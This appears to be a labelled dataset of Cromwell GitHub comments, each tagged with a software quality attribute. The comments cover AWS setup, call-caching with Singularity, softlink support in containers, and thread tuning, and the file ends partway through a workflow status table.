https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:105,Deployability,install,installed,105,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:179,Deployability,deploy,deploy,179,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:1038,Integrability,Message,Message,1038,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:219,Performance,queue,queues,219,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:267,Performance,queue,queue,267,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
https://github.com/broadinstitute/cromwell/pull/6672#issuecomment-1108101215:19,Deployability,patch,patched,19,We already use the patched Jar in production and encountered no issues so far.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6672#issuecomment-1108101215
https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1034463962:134,Availability,error,error,134,really weird. It looks like cromwell is able to run my docker container based on output and log files. It seems like I can ignore the error. seem like a bug to me. I spend a couple of hours trying convince my self it was working,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1034463962
https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1034463962:92,Testability,log,log,92,really weird. It looks like cromwell is able to run my docker container based on output and log files. It seems like I can ignore the error. seem like a bug to me. I spend a couple of hours trying convince my self it was working,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1034463962
https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:227,Performance,cache,cache,227,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504
https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:319,Performance,cache,cache,319,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504
https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:198,Security,hash,hash,198,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040231097:391,Availability,reliab,reliable,391,"Did you test this in real life? Due to the mounting system in containers soft-links may not work at all. This is why they are rightfully banned in docker.; I believe singularity works almost the same. There is no guarantee that the soft-linked target will exist in the container. The filesystem might not be present there, or have a different name.; Just use hard-links, these are much more reliable when working with containers and just as fast.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040231097
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040231097:8,Testability,test,test,8,"Did you test this in real life? Due to the mounting system in containers soft-links may not work at all. This is why they are rightfully banned in docker.; I believe singularity works almost the same. There is no guarantee that the soft-linked target will exist in the container. The filesystem might not be present there, or have a different name.; Just use hard-links, these are much more reliable when working with containers and just as fast.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040231097
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:223,Availability,down,down,223,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:65,Performance,load,load,65,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:130,Security,hash,hashing,130,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:656,Testability,test,tested,656,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:663,Energy Efficiency,reduce,reduce,663,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:169,Performance,load,load,169,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:472,Performance,tune,tune,472,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:674,Performance,load,load,674,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:63,Deployability,pipeline,pipelines,63,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:501,Energy Efficiency,reduce,reduce,501,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:122,Performance,concurren,concurrent,122,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:517,Performance,throughput,throughput,517,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:538,Performance,perform,performance,538,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:329,Availability,error,errors,329,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:725,Availability,error,error,725,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:776,Energy Efficiency,reduce,reduce,776,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:528,Modifiability,config,config,528,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:792,Performance,throughput,throughput,792,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:813,Performance,perform,performance,813,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957
https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918:41,Deployability,release,release,41,"Hello,. I think the problem is solved in release 78 of Cromwell. I had this problem when running the [mocha workflow](https://github.com/freeseek/mocha/blob/6679b1fcdacda4096148a75d5bb08ad1241de988/wdl/mocha.wdl#L899-L903) at Cromwell server 74. After updating to 78 the workflow completed the problematic tasks. - Cromwell 74:. ```; +--------------------+---------+------------+---------------------+; | TASK | ATTEMPT | ELAPSED | STATUS |; +--------------------+---------+------------+---------------------+; | batch_id_lines | 1 | 5m34.003s | Done |; | batch_sorted_tsv | 1 | 4m45.648s | Done |; | csv2bam (Scatter) | - | 10m51.838s | 1/1 Done | 0 Failed |; | green_idat_lines | 1 | 5m34.003s | Done |; | gtc | 1 | 5m27.897s | Done |; | gtc_reheader | 1 | 5m26.257s | Failed |; | idat | 1 | 5m27.897s | Done |; | idat2gtc (Scatter) | - | 10m58.206s | 0/1 Done | 1 Failed |; | red_idat_lines | 1 | 5m34.002s | Done |; | ref_scatter | 1 | 4m39.394s | Done |; | sample_id_lines | 1 | 5m34.003s | Done |; | sample_sorted_tsv | 1 | 4m42.453s | Done |; +--------------------+---------+------------+---------------------+; ❗You have 1 issue:. - Workflow failed; - GCS output file not found: gs://bioinfo-dev-temp/mocha/a224bb3e-fc20-4b0a-8846-ee2b4b603933/call-gtc_reheader/maps; - GCS output file not found: gs://bioinfo-dev-temp/mocha/a224bb3e-fc20-4b0a-8846-ee2b4b603933/call-idat2gtc/shard-0/gtcs; ```. - Cromwell 78. ```; +----------------------------+---------+-----------------+-----------------------+; | TASK | ATTEMPT | ELAPSED | STATUS |; +----------------------------+---------+-----------------+-----------------------+; | batch_id_lines | 1 | 16.37s | Done |; | batch_sorted_tsv | 1 | 15.288s | Done |; | call_rate_lines | 1 | 5m34.525s | Done |; | computed_gender_lines | 1 | 5m34.523s | Done |; | csv2bam (Scatter) | - | 49.958s | 1/1 Done | 0 Failed |; | flatten_sample_id_lines | 1 | 5m29.56s | Done |; | get_max_nrecords (Scatter) | - | 5m32.076s | 1/1 Done | 0 Failed |; | green_idat_l",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918
https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918:3498,Performance,cache,cache,3498,+; | TASK | ATTEMPT | ELAPSED | STATUS |; +----------------------------+---------+-----------------+-----------------------+; | batch_id_lines | 1 | 16.37s | Done |; | batch_sorted_tsv | 1 | 15.288s | Done |; | call_rate_lines | 1 | 5m34.525s | Done |; | computed_gender_lines | 1 | 5m34.523s | Done |; | csv2bam (Scatter) | - | 49.958s | 1/1 Done | 0 Failed |; | flatten_sample_id_lines | 1 | 5m29.56s | Done |; | get_max_nrecords (Scatter) | - | 5m32.076s | 1/1 Done | 0 Failed |; | green_idat_lines | 1 | 16.38s | Done |; | green_idat_tsv | 1 | 5m33.602s | Done |; | gtc | 1 | 10.602s | Done |; | gtc2vcf (Scatter) | - | 8m15.392s | 1/1 Done | 0 Failed |; | gtc_reheader | 1 | 4m16.907s | Done |; | gtc_tsv | 1 | 5m30.578s | Done |; | idat | 1 | 7.606s | Done |; | idat2gtc (Scatter) | - | 9m46.928s | 1/1 Done | 0 Failed |; | mocha_calls_tsv | 1 | 5m19.305941005s | Running |; | mocha_stats_tsv | 1 | 5m19.304938136s | Running |; | red_idat_lines | 1 | 16.386s | Done |; | red_idat_tsv | 1 | 5m33.603s | Done |; | ref_scatter | 1 | 17.728s | Done |; | sample_id_lines | 1 | 16.383s | Done |; | sample_id_split_tsv | 1 | 5m31.462s | Done |; | sample_sorted_tsv | 1 | 11.924s | Done |; | sample_tsv | 1 | 5m26.14s | Done |; | vcf_concat 